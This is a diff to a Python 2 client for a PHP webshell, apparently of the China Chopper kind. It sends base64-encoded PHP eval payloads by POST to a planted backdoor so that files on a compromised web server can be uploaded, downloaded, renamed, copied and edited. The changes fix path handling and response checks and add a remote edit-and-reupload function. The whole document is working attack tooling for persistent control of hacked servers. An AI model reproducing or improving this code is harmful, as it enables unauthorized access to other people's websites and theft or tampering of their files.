@@ -83,8 +83,8 @@ class phpshell:
         echo(@fwrite(fopen($f,"wb"),$buf)?"1":"0");;echo("|<-");die();
         '''.strip()
         #注意 远程和本地都需要指定到文件名
-        remotepath = CorrectPath(remotepath, self.sitepath)
-        print remotepath
+        filename = getfilename(localfile)
+        remotepath = CorrectPath(remotepath , self.sitepath) + filename
         phpcode = self.initcode
         phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotepath))
         with open(localfile, 'rb') as file:
@@ -94,8 +94,7 @@ class phpshell:
             filestream += "%02x" % ord(data[line])
         phpcode += "&z2={0}".format(filestream)
         result = Spider.oldpost(self.url, phpcode)
-        print result
-        if "-|1|<-" in data:
+        if "-|1|<-" in result:
             printf("Upload File Ok!")
 
     #重命名文件 TODO 
@@ -109,10 +108,11 @@ class phpshell:
         ;echo("|<-");die();
         '''
         phpcode = self.initcode            
-        oldname = self.sitepath+ os.sep +oldname
-        newname = self.sitepath+ os.sep +newname
-        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), oldname.replace('\\', '\\\\'), newname.replace('\\', '\\\\'))
-        # urllib.urlencode({'z1':oldname.replace('\\', '\\\\'), 'z2':newname.replace('\\', '\\\\')})
+        oldname = CorrectPath(oldname, self.sitepath)
+        print newname
+        newname = getonepath(oldname) +os.sep + newname
+        print newname
+        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), oldname, newname)
         result = Spider.oldpost(self.url, phpcode)
         if "1" in result:
             printf("rename file ok")
@@ -126,7 +126,8 @@ class phpshell:
         @fclose($P);;echo("\r\n");die();
         '''
         phpcode = self.initcode
-        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(file.replace('\\', '\\\\')))
+        file = CorrectPath(file, self.sitepath)
+        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(file))
         data = Spider.oldpost(self.url, phpcode)
         print data
 
@@ -134,45 +135,55 @@ class phpshell:
     def DownloadFile(self, remotefile, localfile=None):
         code = '''
         @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
-        $F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
+        $F=base64_decode($_POST["z1"]);file_exists($F)?1:exit();$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
         @fclose($P);;die();
         '''
         phpcode = self.initcode
-        if localfile == None:
-            localfile =  remotefile[remotefile.rfind("\\")+1:]
-        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotefile.replace('\\', '\\\\')))
+        remotefile = CorrectPath(remotefile, self.sitepath)
+        localfile = getfilename(remotefile)
+        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotefile))
         data = Spider.oldpost(self.url, phpcode)
-        self.filesave(data, localfile)
-        printf("download file ok")
-
-    #编辑文件
-    def EditFile(self,remotefile):
-        self.DownloadFile(remotefile, remotepath + "tmp{0}{1}".format(os.sep, 'tmp.txt'))
+        if data == "":
+            printf("No this file")
+        else:
+            self.filesave(data, localfile)
+            printf("download file ok")
 
     #移动文件
-    def CopyFile(self, sourcepath, descpath):
-        if sourcepath.find('\\') <0 :
-            sourcepath = self.sitepath + sourcepath
-        if descpath.find('\\') < 0 :
-            descpath = self.sitepath + descpath
+    def CopyFile(self, sourcepath, descpath=None):
+        sourcepath = CorrectPath(sourcepath, self.sitepath)
+        phpcode = '@eval(base64_decode($_POST[x]));&x='
+        if descpath == None or getfilename(descpath) == "":  #网站根目录
+            descpath = CorrectPath(descpath, self.sitepath) + getfilename(sourcepath)
+        else:  #指定路径和文件名
+            descpath = CorrectPath(descpath, self.sitepath)
         code = '''
         @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");;
-        $m=get_magic_quotes_gpc();$fc=%s;
-        $fp=%s;function xcopy($src,$dest){if(is_file($src))
+        $m=get_magic_quotes_gpc();$fc=base64_decode($_POST["z1"]);
+        $fp=base64_decode($_POST["z2"]);function xcopy($src,$dest){if(is_file($src))
         {if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))
         if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;
         if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}
         else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");
-        ;echo("|<-");die();
-        ''' % (sourcepath, descpath)
-        phpcode = self.initcode
-        phpcode += "{0}".format(base64.b64encode(code))
-        self.filesave2(phpcode)
-        data = {self.shellpass:phpcode}
+        ;echo("|<-");die();'''.strip()
+        # phpcode = self.initcode
+        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), base64.b64encode(sourcepath),base64.b64encode(descpath))
+        self.filesave(phpcode, 'copy2.txt')
+        data  ={self.shellpass:phpcode}
         result = Spider.post(self.url, data)
         print result
-        if "-|1|<-" in result:
+        if "1" in result:
             printf("copy file ok")
+
+    def EditFile(self, file):
+        filename = os.path.basename(file)
+        filepath = os.path.dirname(CorrectPath(file, self.sitepath)) + os.sep 
+        self.DownloadFile(file, filename)
+        editor =  'notepad' if IsWin() else 'vim'
+        cmd = "{0} {1}".format(editor, filename)
+        execcmd(cmd)
+        self.UploadFile(filename, filepath)
+        os.remove(filename)
 
     def ShowRule(self, list):
         string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
